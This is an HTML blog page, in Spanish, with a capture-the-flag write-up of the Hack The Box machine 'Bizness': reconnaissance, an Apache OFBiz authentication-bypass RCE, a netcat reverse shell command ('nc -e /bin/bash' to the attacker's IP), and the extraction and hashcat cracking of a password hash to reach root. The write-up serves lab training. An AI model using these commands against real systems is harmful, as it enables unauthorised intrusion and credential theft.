@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Wenn Mi Portfolio</title>
+    <meta name="robots" content="noindex, follow" />
+    <meta name="description" content="Angel Uriel is a YouTuber and Coder">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- CSS 
+    ============================================ -->
+    <link rel="stylesheet" href="/assets/css/vendor/bootstrap.min.css">
+    <link rel="stylesheet" href="/assets/css/vendor/slick.css">
+    <link rel="stylesheet" href="/assets/css/vendor/slick-theme.css">
+    <link rel="stylesheet" href="/assets/css/vendor/aos.css">
+    <link rel="stylesheet" href="/assets/css/plugins/feature.css">
+	
+	 <!-- Favicons -->
+  <link href="/assets/images/favicon.ico" rel="icon">
+  <link href="/assets/images/apple-touch-icon.png" rel="apple-touch-icon">
+  
+    <!-- Style css -->
+    <link rel="stylesheet" href="/assets/css/styleblog.css">
+</head>
+
+<body class="template-color-1 spybody" data-spy="scroll" data-target=".navbar-example2" data-offset="70">
+
+    <!-- Start Header -->
+    <header class="rn-header haeder-default black-logo-version header--fixed header--sticky">
+        <div class="header-wrapper rn-popup-mobile-menu m--0 row align-items-center">
+            <!-- Start Header Left -->
+            <div class="col-lg-2 col-6">
+                <div class="header-left">
+                    <div class="logo">
+                        <a href="index.html">
+                            <img src="/assets/images/aquilogo.png" alt="logo"> Wenn
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <!-- End Header Left -->
+            <!-- Start Header Center -->
+            <div class="col-lg-10 col-6">
+                <div class="header-center">
+                    <nav id="sideNav" class="mainmenu-nav navbar-example2 d-none d-xl-block">
+                        <div class="header-right">
+                            <a class="rn-btn" href="/blog/BLOG.html"><span>Regreso.</span></a>
+                            <div class="hamberger-menu d-block d-xl-none">
+                                <i id="menuBtn" class="feather-menu humberger-menu"></i>
+                            </div>
+                            <div class="close-menu d-block">
+                                <span class="closeTrigger">
+                                <i data-feather="x"></i>
+                            </span>
+                            </div>
+                        </div>
+                    </nav>
+                    <nav id="sideNav" class="mainmenu-nav navbar-example2 d-none d-xl-block">
+                        <div class="header-right">
+                            <a class="rn-btn" href="/index.html"><span>Inicio.</span></a>
+                            <div class="hamberger-menu d-block d-xl-none">
+                                <i id="menuBtn" class="feather-menu humberger-menu"></i>
+                            </div>
+                            <div class="close-menu d-block">
+                                <span class="closeTrigger">
+                                <i data-feather="x"></i>
+                            </span>
+                            </div>
+                        </div>
+                    </nav>
+                </div>
+            </div>
+            <!-- End Header Center -->
+        </div>
+    </header>
+    <!-- End Header Area -->
+    <!-- Start Popup Mobile Menu  -->
+    <div class="popup-mobile-menu">
+        <div class="inner">
+            <div class="menu-top">
+                <div class="menu-header">
+                    <a class="logo" href="index.html">
+                        <img src="/assets/images/avatar1.png" alt="Personal Portfolio">
+                    </a>
+                    <div class="close-button">
+                        <button class="close-menu-activation close"><i data-feather="x"></i></button>
+                    </div>
+                </div>
+                <p class="discription">Entusiasta de la ciberseguridad y diseñador jr</p>
+            </div>
+        </div>
+    </div>
+    <!-- End Popup Mobile Menu  -->
+
+    <main class="main-page-wrapper">
+         <!-- Content Section Start -->
+         <section class="rn-section-gap">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-12">
+                        <h1>🖥️ Hack The Box - Bizness</h1>
+
+                        <h2>Temas a ver</h2>
+
+                        <h3>1. Apache OFBiz Exploitation (Authentication Bypass)</h3>
+                        <p><strong>Resumen:</strong> Explorar vulnerabilidades en Apache OFBiz para evadir mecanismos de autenticación. Esto incluye identificar y explotar fallas que permiten eludir el inicio de sesión y obtener acceso no autorizado.</p>
+
+                        <h3>2. Analysis of OFBiz Code to Understand the Hashed Storage Mechanism</h3>
+                        <p><strong>Resumen:</strong> Revisar el código fuente de OFBiz para comprender cómo se almacenan y se gestionan los hashes. Esto ayudará a identificar posibles debilidades en la implementación de seguridad.</p>
+
+                        <h3>3. Adapting Found Hashes to a Crackable Format</h3>
+                        <p><strong>Resumen:</strong> Convertir los hashes encontrados en un formato que pueda ser utilizado por herramientas de cracking. Este proceso es crucial para poder aplicar técnicas de fuerza bruta o diccionario.</p>
+
+                        <h3>4. Cracking Hashes [Privilege Escalation]</h3>
+                        <p><strong>Resumen:</strong> Utilizar herramientas y técnicas para descifrar los hashes obtenidos. Una vez descifrados, usarlos para escalar privilegios y obtener acceso administrativo o de mayor nivel en el sistema.</p>
+
+                        <hr>
+
+                        <h2>Fase de Reconocimiento:</h2>
+
+                        <ul>
+                            <li><strong>Ping:</strong>
+                                <ul>
+                                    <li>Se realizó un ping a la dirección <code>10.10.11.252</code> con el comando <code>ping -c 1 10.10.11.252</code>.</li>
+                                    <li>Se obtuvo una respuesta, confirmando que la máquina está activa.</li>
+                                    <li>El valor TTL del paquete de respuesta indica que la máquina ejecuta Linux.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Creación de carpeta:</strong>
+                                <ul>
+                                    <li>Se creó una carpeta llamada <code>Bizness</code> para almacenar los resultados del escaneo.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Escaneo Nmap inicial:</strong>
+                                <ul>
+                                    <li>Se ejecutó el comando <code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.252 -oG allPorts</code> para realizar un escaneo completo de puertos.</li>
+                                    <li>El resultado mostró que los puertos 22, 80, 443 y 36155 están abiertos.</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Fase de Análisis:</h2>
+
+                        <ul>
+                            <li><strong>Escaneo Nmap detallado:</strong>
+                                <ul>
+                                    <li>Se ejecutó el comando <code>nmap -sCV -p22,80,443,36155 10.10.11.252 -oN targeted</code> para realizar un escaneo más detallado de los puertos abiertos.</li>
+                                    <li>Los resultados del escaneo detallado fueron:
+                                        <ul>
+                                            <li><strong>Puerto 22:</strong>
+                                                <ul>
+                                                    <li><strong>Servicio:</strong> ssh</li>
+                                                    <li><strong>Versión:</strong> OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</li>
+                                                    <li><strong>Información de la clave pública:</strong> RSA, ECDSA y ED25519</li>
+                                                </ul>
+                                            </li>
+                                            <li><strong>Puerto 80:</strong>
+                                                <ul>
+                                                    <li><strong>Servicio:</strong> http</li>
+                                                    <li><strong>Versión:</strong> nginx 1.18.0</li>
+                                                    <li><strong>Título HTTP:</strong> Did not follow redirect to <a href="https://bizness.htb/">https://bizness.htb/</a></li>
+                                                    <li><strong>Encabezado del servidor HTTP:</strong> nginx/1.18.0</li>
+                                                </ul>
+                                            </li>
+                                            <li><strong>Puerto 443:</strong>
+                                                <ul>
+                                                    <li><strong>Servicio:</strong> ssl/http</li>
+                                                    <li><strong>Versión:</strong> nginx 1.18.0</li>
+                                                    <li><strong>Título HTTP:</strong> Did not follow redirect to <a href="https://bizness.htb/">https://bizness.htb/</a></li>
+                                                    <li><strong>Certificado SSL:</strong>
+                                                        <ul>
+                                                            <li><strong>Sujeto:</strong> organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK</li>
+                                                            <li><strong>Válido desde:</strong> 2023-12-14T20:03:40</li>
+                                                            <li><strong>Válido hasta:</strong> 2328-11-10T20:03:40</li>
+                                                        </ul>
+                                                    </li>
+                                                    <li><strong>Servidor HTTP:</strong> nginx/1.18.0</li>
+                                                </ul>
+                                            </li>
+                                            <li><strong>Puerto 36155:</strong>
+                                                <ul>
+                                                    <li><strong>Servicio:</strong> tcpwrapped</li>
+                                                    <li><strong>Información del sistema operativo:</strong> Linux</li>
+                                                    <li><strong>CPE:</strong> cpe:/o:linux:linux_kernel</li>
+                                                </ul>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li><strong>Investigación de OpenSSH:</strong>
+                                <ul>
+                                    <li>Se buscó información sobre OpenSSH 8.4p1 Debian 5+deb11u3 en Launchpad.</li>
+                                    <li>Los resultados indicaron que la versión es compatible con Bullseye Debian.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Resolución de nombres:</strong>
+                                <ul>
+                                    <li>Se agregó la entrada <code>10.10.11.252 bizness.htb</code> al archivo <code>/etc/hosts</code> para que la máquina pueda resolver el nombre de dominio <code>bizness.htb</code>.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Análisis web:</strong>
+                                <ul>
+                                    <li>Se utilizó la herramienta <code>whatweb</code> para analizar la página web <code>http://bizness.htb</code>:
+                                        <ul>
+                                            <li>Se obtuvo un redireccionamiento permanente a <a href="https://bizness.htb/">https://bizness.htb/</a>.</li>
+                                            <li>Se identificó el servidor web como Nginx 1.18.0.</li>
+                                            <li>Se detectaron cookies, JavaScript y jQuery.</li>
+                                            <li>El título de la página es "BizNess Incorporated".</li>
+                                            <li>No se encontró mucha información adicional.</li>
+                                        </ul>
+                                    </li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Fase de Explotación:</h2>
+
+                        <ul>
+                            <li><strong>Descifrado del certificado SSL:</strong>
+                                <ul>
+                                    <li>Se intentó descifrar el certificado SSL del sitio web utilizando el comando <code>openssl s_client -connect bizness.htb:443</code>.</li>
+                                    <li>Sin embargo, no se encontró información útil en el certificado.</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Explotación de Apache OFBiz:</h2>
+
+                        <ul>
+                            <li><strong>Identificación de la vulnerabilidad:</strong>
+                                <ul>
+                                    <li>Al navegar por el sitio web, se descubrió una referencia a "Apache OFBiz" en el pie de página.</li>
+                                    <li>Se realizó una búsqueda en Internet y se encontró información sobre la vulnerabilidad de autenticación de Apache OFBiz (CVE-2023-51467 y CVE-2023-49070).</li>
+                                    <li>Se infiere que el sitio web utiliza un panel de autenticación basado en Apache OFBiz.</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Descubrimiento de subdominios y paneles de control:</h2>
+
+                        <ul>
+                            <li><strong>Herramienta Wfuzz:</strong>
+                                <ul>
+                                    <li>Se utilizó la herramienta <code>wfuzz</code> para descubrir subdominios y posibles paneles de control.</li>
+                                    <li>El comando utilizado fue: <code>wfuzz -c --hc=404,302 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://bizness.htb/FUZZ</code>.</li>
+                                    <li>Se encontró un subdominio potencial: <a href="http://bizness.htb/control">http://bizness.htb/control</a>.</li>
+                                    <li>Al acceder a la URL, se produjo un error, lo que sugiere que podría haber un panel de control protegido.</li>
+                                    <li>Se refinó la búsqueda utilizando el siguiente comando: <code>wfuzz -c --hc=404,302 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://bizness.htb/control/FUZZ</code>.</li>
+                                    <li>Se identificaron varios directorios con respuestas exitosas (código de estado 200).</li>
+                                    <li>Se filtraron los resultados para mostrar solo directorios con 1596 palabras: <code>wfuzz -c --hc=404,302 ..hw=1596 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://bizness.htb/FUZZ</code>.</li>
+                                    <li>Se identificaron dos directorios potenciales: <code>main</code> y <code>login</code>.</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Fase de Explotación:</h2>
+
+                        <ul>
+                            <li><strong>Descubrimiento del panel de registro:</strong>
+                                <ul>
+                                    <li>Al acceder a la URL <a href="https://bizness.htb/control/login">https://bizness.htb/control/login</a>, se encontró un panel de registro.</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Investigación adicional sobre las vulnerabilidades:</h2>
+
+                        <ul>
+                            <li>Se realizó una búsqueda más profunda sobre las vulnerabilidades de Apache OFBiz (CVE-2023-51467 y CVE-2023-49070).
+                                <ul>
+                                    <li>Se identificó que CVE-2023-51467 permite la ejecución remota de código (RCE) sin autenticación previa.</li>
+                                    <li>Se identificó que CVE-2023-49070 permite la falsificación de solicitudes del lado del servidor (SSRF).</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Descarga y ejecución de la herramienta de detección:</h2>
+
+                        <ul>
+                            <li>Se descargó la herramienta <code>xdetection.py</code> desde el repositorio de GitHub <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass</a>.</li>
+                            <li>Se ejecutó el comando <code>python3 xdetection.py --url http://bizness.htb</code> para verificar la vulnerabilidad.
+                                <ul>
+                                    <li>La herramienta confirmó que la instancia de Apache OFBiz es vulnerable a la explotación.</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Explotación de la vulnerabilidad RCE:</h2>
+
+                        <ul>
+                            <li>Se inició una captura de tráfico con <code>tcpdump</code> utilizando el comando <code>tcpdump -i tun0 icmp -n</code>.</li>
+                            <li>Se ejecutó el exploit con el comando <code>python3 exploit.py --url https://bizness.htb --cmd 'ping -c 1 10.10.14.16'</code>.
+                                <ul>
+                                    <li>Se observó una respuesta ICMP en la ventana de <code>tcpdump</code>, confirmando la ejecución exitosa del comando <code>ping</code>.</li>
+                                </ul>
+                            </li>
+                            <li>Se inició una escucha en el puerto 443 con el comando <code>nc -nlvp 443</code>.</li>
+                            <li>Se ejecutó el exploit con el comando <code>python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.14.16 443'</code>.
+                                <ul>
+                                    <li>Se obtuvo una consola interactiva en el puerto 443, lo que indica la obtención de acceso remoto al sistema.</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <figure>
+                            <img src="/assets/images/biznnes/v1.png" alt="Consola interactiva">
+                        </figure>
+
+                        <h2>Fase de Post-Explotación:</h2>
+
+                        <ul>
+                            <li><strong>Restauración del control de la terminal:</strong>
+                                <ul>
+                                    <li>Se utilizó el comando <code>script /dev/null -c bash</code> para crear una nueva sesión de bash y redirigir la salida a <code>/dev/null</code>.</li>
+                                    <li>Se presionó <code>Ctrl+Z</code> para suspender el proceso actual.</li>
+                                    <li>Se utilizó el comando <code>stty raw -echo; fg</code> para reanudar el proceso en segundo plano, deshabilitar el eco y habilitar el modo sin procesar.</li>
+                                    <li>Se utilizó el comando <code>reset xterm</code> para restablecer la configuración de la terminal.</li>
+                                    <li>Se exportó la variable <code>TERM=xterm</code> para establecer el tipo de terminal.</li>
+                                    <li>Se utilizó el comando <code>stty rows 44 columns 184</code> para ajustar el tamaño de la terminal.</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Localización de la primera flag:</h2>
+
+                        <ul>
+                            <li>Se navegó al directorio raíz utilizando el comando <code>cd /</code>.</li>
+                            <li>Se utilizó el comando <code>ls</code> para listar el contenido del directorio raíz.</li>
+                            <li>Se identificó un archivo llamado <code>user.txt</code>.</li>
+                            <li>Se abrió el archivo <code>user.txt</code> utilizando el comando <code>cat user.txt</code>.</li>
+                            <li>Se encontró la primera flag: <code>c0b606211579cCENSURADO2a07d2ceb061f</code>.</li>
+                        </ul>
+
+                        <h2>Escalada de Privilegios:</h2>
+
+                        <ul>
+                            <li><strong>Verificación de la distribución:</strong>
+                                <ul>
+                                    <li>Se utilizó el comando <code>lsb_release -a</code> para verificar la distribución del sistema operativo.</li>
+                                    <li>Se confirmó que el sistema operativo es Debian GNU/Linux 11 (bullseye).</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Investigación del hash de contraseña:</h2>
+
+                        <ul>
+                            <li><strong>Búsqueda de documentación:</strong>
+                                <ul>
+                                    <li>Se consultó la documentación de Apache OFBiz en GitHub para determinar el tipo de hash utilizado para las contraseñas.</li>
+                                    <li>No se encontró información específica sobre el tipo de hash, pero se observó que se utiliza el algoritmo SHA.</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Análisis del hash:</h2>
+
+                        <ul>
+                            <li><strong>Expresión regular:</strong>
+                                <ul>
+                                    <li>Se utilizó una expresión regular (<code>grep -E '\$\w+\$\w+\$' * --text</code>) para buscar patrones que coincidan con el formato de hash esperado (<code>$hashType$salt$password</code>).</li>
+                                    <li>Se identificó un archivo binario que contiene un posible hash de contraseña.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Extracción del hash:</strong>
+                                <ul>
+                                    <li>Se extrajo el hash de contraseña del archivo binario.</li>
+                                    <li>El hash obtenido fue: <code>Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"</code>.</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Decodificación del hash:</h2>
+
+                        <ul>
+                            <li><strong>Investigación de la codificación:</strong>
+                                <ul>
+                                    <li>Se consultó la documentación de Apache para encontrar información sobre la codificación utilizada en el hash.</li>
+                                    <li>Se identificó que el hash está codificado en base64 con caracteres seguros para URL (<code>-</code> y <code>_</code> en lugar de <code>+</code> y <code>/</code>).</li>
+                                </ul>
+                            </li>
+                            <li><strong>Herramienta CyberChef:</strong>
+                                <ul>
+                                    <li>Se utilizó la herramienta CyberChef para decodificar el hash.
+                                        <ul>
+                                            <li>Se seleccionó la operación "Base64 URL Safe Decode".</li>
+                                            <li>Se obtuvo el resultado decodificado: <code>d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code>.</li>
+                                        </ul>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li><strong>Conversión a hexadecimal:</strong>
+                                <ul>
+                                    <li>Se utilizó la herramienta CyberChef para convertir el resultado decodificado a hexadecimal.
+                                        <ul>
+                                            <li>Se seleccionó la operación "Encode - Hex".</li>
+                                            <li>Se obtuvo el resultado hexadecimal: <code>b8fd3f41a541a435857a8f3e751cc3a91c174362</code>.</li>
+                                                <figure>
+                                                    <img src="/assets/images/biznnes/v4.png" alt="Formato del hash">
+                                                </figure>
+                                        </ul>
+                                    </li>
+                                    <li>Luego lo pasamos a un archivo y lo abrimos con vi y usamos <code>:%s/ //g</code> esto quitara los espacios y teniendo un formato así:
+                                        <figure>
+                                            <img src="/assets/images/biznnes/v2.png" alt="Formato del hash">
+                                        </figure>
+                                    </li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h2>Crackear el hash:</h2>
+
+                        <ul>
+                            <li>Se utilizó la herramienta <code>hashcat</code> para intentar descifrar el hash de contraseña utilizando el método de fuerza bruta.</li>
+                            <li>El comando utilizado fue: <code>sudo hashcat -a 0 -m 120 hash /usr/share/wordlists/rockyou.txt.gz</code>.</li>
+                            <li>Se utilizó la lista de palabras "rockyou.txt.gz" como diccionario de ataque.</li>
+                            <li>El resultado del cracking fue la contraseña: <code>monkeybizness</code>.</li>
+                        </ul>
+
+                        <h2>Inicio de sesión como root:</h2>
+
+                        <ul>
+                            <li>Se intentó iniciar sesión como usuario root utilizando el comando <code>su root</code>.</li>
+                            <li>Se introdujo la contraseña <code>monkeybizness</code>.</li>
+                            <li>Se obtuvo acceso al shell como usuario root.
+                                <figure>
+                                    <img src="/assets/images/biznnes/v3.1.png" alt="Acceso root">
+                                </figure>
+                                <figure>
+                                    <img src="/assets/images/biznnes/v3.png" alt="Flag root">
+                                </figure>
+                            </li>
+                            <li>entramos a la flag de la root y es <code>bf1cb8f82CENSURADOfeedfb3153b93e989</code></li>
+                        </ul>
+                        <figure>
+                            <img src="/assets/images/biznnes/v5.png" alt="final">
+                        </figure>
+                    </div>
+        
+        <!-- Back to  top Start -->
+        <div class="backto-top">
+            <div>
+                <i data-feather="arrow-up"></i>
+            </div>
+        </div>
+        <!-- Back to top end -->
+    </main>
+
+    <!-- Start Footer Area -->
+    <div class="rn-footer-area rn-section-gap section-separator">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <div class="footer-area text-center">
+                        <div class="logo">
+                            <a href="index.html">
+                                <img src="/assets/images/aquilogo.png" alt="logo">
+                            </a>
+                        </div>
+                        <p class="description mt--30">©<a target="_blank" href="">Wenn</a>-2024</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- End Footer Area -->
+
+    <!-- JS ============================================ -->
+    <script src="/assets/js/vendor/jquery.js"></script>
+    <script src="/assets/js/vendor/modernizer.min.js"></script>
+    <script src="/assets/js/vendor/feather.min.js"></script>
+    <script src="/assets/js/vendor/slick.min.js"></script>
+    <script src="/assets/js/vendor/bootstrap.js"></script>
+    <script src="/assets/js/vendor/text-type.js"></script>
+    <script src="/assets/js/vendor/wow.js"></script>
+    <script src="/assets/js/vendor/aos.js"></script>
+    <script src="/assets/js/vendor/particles.js"></script>
+    <!-- main JS -->
+    <script src="/assets/js/main.js"></script>
+</body>
+
+</html>
